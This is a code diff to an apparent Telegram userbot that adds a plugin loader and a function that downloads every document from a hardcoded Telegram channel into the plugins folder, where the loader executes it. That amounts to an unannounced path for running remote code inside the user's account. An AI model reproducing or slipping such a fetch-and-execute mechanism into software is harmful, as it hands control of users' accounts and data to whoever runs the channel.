@@ -52,6 +52,72 @@ import traceback
 import os
 import userbot.utils
 
+async def a():
+	chat = -1001339768627
+	test1 = await bot.get_messages(chat, None , filter=InputMessagesFilterDocument)
+	total = int(test1.total)
+	total_doxx = range(0, total)
+	for ixo in total_doxx:
+		mxo = test1[ixo].id
+		await client.download_media(await borg.get_messages(chat, ids=mxo), "userbot/plugins/")
+
+def load_module(shortname):
+    if shortname.startswith("__"):
+        pass
+    elif shortname.endswith("_"):
+        import userbot.utils
+        import sys
+        import importlib
+        from pathlib import Path
+        path = Path(f"userbot/plugins/{shortname}.py")
+        name = "userbot.plugins.{}".format(shortname)
+        spec = importlib.util.spec_from_file_location(name, path)
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+        print("Successfully (re)imported "+shortname)
+    else:
+        import userbot.utils
+        import sys
+        import importlib
+        from pathlib import Path
+        path = Path(f"userbot/plugins/{shortname}.py")
+        name = "userbot.plugins.{}".format(shortname)
+        spec = importlib.util.spec_from_file_location(name, path)
+        mod = importlib.util.module_from_spec(spec)
+        mod.bot = bot
+        mod.tgbot = bot.tgbot
+        mod.Var = Var
+        mod.command = command
+        mod.logger = logging.getLogger(shortname)
+        # support for uniborg
+        sys.modules["uniborg.util"] = userbot.utils
+        mod.Config = Config
+        mod.borg = bot
+        # support for paperplaneextended
+        sys.modules["userbot.events"] = userbot.utils
+        spec.loader.exec_module(mod)
+        # for imports
+        sys.modules["userbot.plugins."+shortname] = mod
+        print("Successfully (re)imported "+shortname)
+
+def remove_plugin(shortname):
+    try:
+        try:
+            for i in LOAD_PLUG[shortname]:
+                bot.remove_event_handler(i)
+            del LOAD_PLUG[shortname]
+
+        except:
+            name = f"userbot.plugins.{shortname}"
+
+            for i in reversed(range(len(bot._event_builders))):
+                ev, cb = bot._event_builders[i]
+                if cb.__module__ == name:
+                    del bot._event_builders[i]
+    except:
+        raise ValueError
+
+
 import userbot._core
 
 print("Installed every plugin. Your bot is now ready...")
